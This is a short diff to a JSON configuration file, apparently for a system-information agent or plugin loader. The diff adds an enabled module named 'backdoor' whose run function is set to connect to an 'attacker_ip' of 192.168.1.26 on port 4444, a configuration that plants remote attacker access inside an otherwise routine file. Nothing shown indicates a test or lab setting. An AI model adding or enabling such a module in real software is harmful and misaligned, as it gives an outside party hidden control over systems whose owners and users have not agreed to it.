@@ -24,6 +24,16 @@
         "get_system_info": [],
         "list_running_processes": []
       }
+    },
+    {
+      "name": "backdoor",
+      "enabled": true,
+      "functions": {
+        "run": {
+          "attacker_ip": "192.168.1.26",
+          "attacker_port": 4444
+        }
+      }
     }
   ]
 }
